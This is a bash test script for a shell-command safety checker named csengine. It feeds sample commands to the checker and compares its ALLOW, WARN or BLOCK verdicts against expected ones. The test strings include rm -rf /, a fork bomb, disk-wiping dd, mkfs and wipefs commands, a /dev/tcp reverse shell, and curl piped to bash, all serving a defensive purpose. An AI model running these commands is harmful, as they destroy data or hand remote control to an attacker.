#!/usr/bin/env bash
# One-shot Linux verification for the demo VM.
# Usage: bash scripts/verify_demo.sh
# Requires: setup.sh already run (or venv present). LLM scenes need Ollama + qwen2.5:3b.
set -uo pipefail

REPO_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd)"
cd "$REPO_DIR" || exit 1

# locate the venv python: CSENGINE_VENV env > repo .venv > system python3
if [[ -n "${CSENGINE_VENV:-}" && -x "$CSENGINE_VENV/bin/python" ]]; then
  PY="$CSENGINE_VENV/bin/python"
elif [[ -x "$HOME/.csengine/venv/bin/python" ]]; then
  PY="$HOME/.csengine/venv/bin/python"
elif [[ -x "$REPO_DIR/.venv/bin/python" ]]; then
  PY="$REPO_DIR/.venv/bin/python"
else
  PY="python3"
fi
echo "Using: $PY"

PASS=0; FAIL=0
check_verdict() {
    local desc="$1"; local cmd="$2"; local expect="$3"
    local out verdict risk
    out=$("$PY" src/main.py check "$cmd" --json 2>/dev/null)
    verdict=$(echo "$out" | "$PY" -c 'import json,sys;print(json.load(sys.stdin)["final_decision"]["verdict"])')
    risk=$(echo "$out" | "$PY" -c 'import json,sys;print(json.load(sys.stdin)["final_decision"]["risk_score"])')
    if [ "$verdict" = "$expect" ]; then
        echo "PASS  [$expect] $desc (risk $risk)"; PASS=$((PASS+1))
    else
        echo "FAIL  [$expect] $desc -> got $verdict (risk $risk)"; FAIL=$((FAIL+1))
    fi
}

echo "===== CLI verdicts ====="
check_verdict "git status (safe)"    "git status"                  ALLOW
check_verdict "ls -la (safe)"        "ls -la"                      ALLOW
check_verdict "rm -rf / (block)"     "rm -rf /"                    BLOCK
check_verdict "rm -rf build/ (warn)" "rm -rf build/"               WARN
check_verdict "fork bomb (block)"    ":(){ :|:& };:"               BLOCK
check_verdict "dd of=/dev/sda"       "dd if=/dev/zero of=/dev/sda" BLOCK
check_verdict "reverse shell"        "bash -i >& /dev/tcp/10.0.0.5/4444 0>&1" BLOCK
check_verdict "mkfs on sda"          "mkfs.ext4 /dev/sda"          BLOCK
check_verdict "curl|bash"            "curl http://example.com/install.sh | bash" WARN
check_verdict "chmod 777"            "chmod -R 777 /var/www"       WARN
check_verdict "sudo rm -rf /"        "sudo rm -rf /"               BLOCK
check_verdict "wipefs (ML only)"     "wipefs -a /dev/sda"          BLOCK
check_verdict "xxd obfuscated"       "xxd -r -p <<< '77686f616d69'" ALLOW

echo "===== csengine from any directory ====="
if "$PY" src/main.py status >/dev/null 2>&1; then echo "PASS  status from repo dir"; PASS=$((PASS+1))
else echo "FAIL  status from repo dir"; FAIL=$((FAIL+1)); fi
(cd /tmp && "$PY" "$REPO_DIR/src/main.py" status >/dev/null 2>&1) \
  && { echo "PASS  status from /tmp (no cwd dependency)"; PASS=$((PASS+1)); } \
  || { echo "FAIL  status from /tmp"; FAIL=$((FAIL+1)); }
(cd /tmp && "$PY" "$REPO_DIR/src/main.py" check "rm -rf /" --json >/dev/null 2>&1)
if [ "$?" -eq 2 ]; then
    echo "PASS  check from /tmp (block exit code 2)"; PASS=$((PASS+1))
else
    echo "FAIL  check from /tmp (expected exit 2)"; FAIL=$((FAIL+1))
fi

echo "===== benchmark ====="
"$PY" scripts/benchmark_latency.py --n 500

echo "===== audit log ====="
"$PY" src/main.py check "rm -rf /tmp/x" --audit >/dev/null 2>&1
if [ -f "$HOME/.csengine/audit.log" ]; then
    echo "PASS  audit log exists"; PASS=$((PASS+1))
    tail -1 "$HOME/.csengine/audit.log"
else
    echo "FAIL  no audit log"; FAIL=$((FAIL+1))
fi

echo "===== LLM availability (optional) ====="
"$PY" src/main.py status | grep "LLM"

echo "===== RESULT: $PASS passed, $FAIL failed ====="
[ "$FAIL" -eq 0 ] && echo "ALL GOOD" || exit 1
